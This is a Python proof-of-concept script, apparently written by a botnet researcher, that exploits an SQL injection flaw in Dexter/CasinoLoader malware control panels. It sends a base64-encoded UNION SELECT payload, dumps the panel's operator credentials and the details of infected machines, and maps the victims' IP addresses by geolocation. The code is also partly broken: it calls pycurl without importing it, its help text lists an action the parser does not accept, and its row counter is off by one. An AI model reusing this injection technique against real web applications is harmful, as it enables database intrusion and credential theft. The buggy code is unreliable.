import urllib
import cStringIO
import base64
import argparse
import sys
import string
import pygeoip
 
version = "0.1-http_bots-PoC"
 
 
def PrintHelp():
    global version
    print "usage: dexter.PoC.py [-h] [action] [gateway url]"
    print ""
    print "Dexter CasinoLoader BAMF PoC v" + version
    print "Exploiting CasinoLoader panels for information"
    print "By Brian Wallace (@botnet_hunter)"
    print ""
    print "arguments:"
    print "  action        Actions to be taken against the botnet (default: dump)"
    print "                dump - Print configuration information obtained from source file"
    print "                drop - Execute a command to make the bot scripts exit"
    print "  source        Path to non-obfuscated source code for the target bot (default: stdin)"
    print ""
    print("GPS:")
    print("  -m MaxMind Location           Location of Maxmind database files (default .)")
    print ""
    print "  -h, --help    Print this message"
    print ""
 
 
class DexterPanel:
    def __init__(self, gateway_url):
        self.gateway_url = gateway_url
 
    @staticmethod
    def _get_field(gateway, table, column, row):
        buf = cStringIO.StringIO()
        c = pycurl.Curl()
        c.setopt(c.URL, gateway)
        page = "&#039; AND 1=2 UNION ALL SELECT 1," + column + ",3 FROM " + table + " LIMIT 1 OFFSET " + str(row) + " -- --"
        params = urllib.urlencode({&#039;val&#039;: &#039;AA==&#039;, &#039;page&#039;: base64.b64encode(page)})
        c.setopt(c.POSTFIELDS, params)
        c.setopt(c.HEADERFUNCTION, buf.write)
        c.perform()
 
        val = buf.getvalue()
        cookie = None
        for line in val.split(&#039;\n&#039;):
            line = line.strip()
            if line.count(&#039;Set-Cookie:&#039;) > 0 and line.count("response") > 0:
                cookie = line
                cookie = cookie[cookie.find(&#039;=&#039;) + 1:]
                cookie = urllib.unquote(cookie)
                cookie = base64.b64decode(cookie)
                cookie = cookie[1:]
                cookie = cookie[:-2]
                break
        buf.close()
        return cookie
 
    def get_all_user_details(self):
        count = 0
        users = []
        while True:
            user = self._get_field(self.gateway_url, &#039;users&#039;, &#039;name&#039;, count)
            if user is None or user == "":
                break
            password = self._get_field(self.gateway_url, &#039;users&#039;, &#039;password&#039;, count)
            count += 1
            users.append({&#039;user&#039;: user, &#039;password&#039;: password})
        return users
 
    def get_all_bot_details(self):
        count = 0
        bots = []
        while True:
            user = self._get_field(self.gateway_url, &#039;bots&#039;, &#039;RemoteIP&#039;, count)
            if user is None or user == "":
                break
            count += 1
            bots.append({&#039;RemoteIP&#039;: user,
                         &#039;UID&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;UID&#039;, count),
                         &#039;Version&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;Version&#039;, count),
                         &#039;Username&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;Username&#039;, count),
                         &#039;Computername&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;Computername&#039;, count),
                         &#039;UserAgent&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;UserAgent&#039;, count),
                         &#039;OS&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;OS&#039;, count),
                         &#039;Architecture&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;Architecture&#039;, count),
                         &#039;Idle Time&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;Idle Time&#039;, count),
                         &#039;Process List&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;Process List&#039;, count),
                         &#039;LastVisit&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;LastVisit&#039;, count),
                         &#039;LastCommand&#039;: self._get_field(self.gateway_url, &#039;bots&#039;, &#039;LastCommand&#039;, count)})
        return bots
 
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument(&#039;action&#039;, nargs=&#039;?&#039;, type=str, default="dump", help="Actions to be taken against pBots (default: dump)", choices=["dump", "graph"])
    parser.add_argument(&#039;gateway&#039;, nargs=&#039;?&#039;, type=str, default=None, help="URL to Dexter bot gateway")
    parser.add_argument(&#039;-m&#039;, metavar=&#039;maxmind&#039;, type=str, nargs=&#039;?&#039;, default=&#039;./GeoLiteCity.dat&#039;)
    parser.add_argument(&#039;-h&#039;, &#039;--help&#039;, default=False, required=False, action=&#039;store_true&#039;)
 
    args = parser.parse_args()
 
    if args.help or args.gateway is None:
        PrintHelp()
        sys.exit()
 
    if args.action == "dump":
        url = args.gateway
        dex = DexterPanel(url)
        print "User details: %s" % dex.get_all_user_details()
        print "Bot details: %s" % dex.get_all_bot_details()
    elif args.action == "graph":
        url = args.gateway
        dex = DexterPanel(url)
        bots = dex.get_all_bot_details()
 
        #load Maxmind
        sys.stderr.write(&#039;Loading MaxMind Database\n&#039;)
        gi = pygeoip.GeoIP(args.m)
 
        nodes = {}
        connections = []
 
        nodes["C2"] = {"id": 0, "label": "C2", "mod": 0}
        highestnode = 1
 
        #loop through all bots
        for bot in bots:
            ip = bot["RemoteIP"]
            geoip = gi.record_by_addr(ip)
            node = {"id": highestnode, "label": ip, "host": ip, "mod": 1}
            highestnode += 1
            if geoip is not None:
                node[&#039;lat&#039;] = geoip["latitude"]
                node[&#039;lng&#039;] = geoip["longitude"]
                nodes[ip] = node
                connections.append([node[&#039;id&#039;], 0])
 
        print(&#039;<?xml version="1.0" encoding="UTF-8"?>&#039;)
        print(&#039;<gexf xmlns="http://www.gexf.net/1.2draft" version="1.2">&#039;)
        print(&#039;    <meta lastmodifieddate="2009-03-20">&#039;)
        print((&#039;        <creator>&#039; + "bwall" + &#039;</creator>&#039;))
        print(&#039;        <description></description>&#039;)
        print(&#039;    </meta>&#039;)
        print(&#039;    <graph mode="static" defaultedgetype="directed">&#039;)
        print(&#039;    <attributes class="node" mode="static">&#039;)
        print(&#039;      <attribute id="modularity_class" title="Modularity Class" type="integer"></attribute>&#039;)
        print(&#039;      <attribute id="lat" title="lat" type="double"></attribute>&#039;)
        print(&#039;      <attribute id="lng" title="lng" type="double"></attribute>&#039;)
        print(&#039;    </attributes>&#039;)
        print(&#039;        <nodes>&#039;)
 
        for name, node in list(nodes.items()):
            if &#039;lat&#039; in node:
                print((&#039;            <node id="&#039; + str(node[&#039;id&#039;]) + &#039;" label="&#039; +
                    node[&#039;label&#039;] + &#039;">&#039;))
                print(&#039;                <attvalues>&#039;)
                print((&#039;                    <attvalue for="modularity_class" value="&#039; +
                    str(node[&#039;mod&#039;]) + &#039;"></attvalue>&#039;))
                print(&#039;                     <attvalue for="lat" value="&#039; + str(node[&#039;lat&#039;]) + &#039;"></attvalue>&#039;)
                print(&#039;                     <attvalue for="lng" value="&#039; + str(node[&#039;lng&#039;]) + &#039;"></attvalue>&#039;)
                print(&#039;                </attvalues>&#039;)
                print(&#039;            </node>&#039;)
            else:
                print((&#039;            <node id="&#039; + str(node[&#039;id&#039;]) + &#039;" label="&#039; +
                    node[&#039;label&#039;] + &#039;">&#039;))
                print(&#039;                <attvalues>&#039;)
                print((&#039;                    <attvalue for="modularity_class" value="&#039; +
                    str(node[&#039;mod&#039;]) + &#039;"></attvalue>&#039;))
                print(&#039;                     <attvalue for="lat" value="0"></attvalue>&#039;)
                print(&#039;                     <attvalue for="lng" value="0"></attvalue>&#039;)
                print(&#039;                </attvalues>&#039;)
                print(&#039;            </node>&#039;)
        print(&#039;        </nodes>&#039;)
        print(&#039;        <edges>&#039;)
        count = 0
        for node in connections:
            print((&#039;            <edge id="&#039; + str(count) + &#039;" source="&#039; + str(node[0]) +
                 &#039;" target="&#039; + str(node[1]) + &#039;" />&#039;))
            count += 1
        print(&#039;        </edges>&#039;)
        print(&#039;    </graph>&#039;)
        print(&#039;</gexf>&#039;)

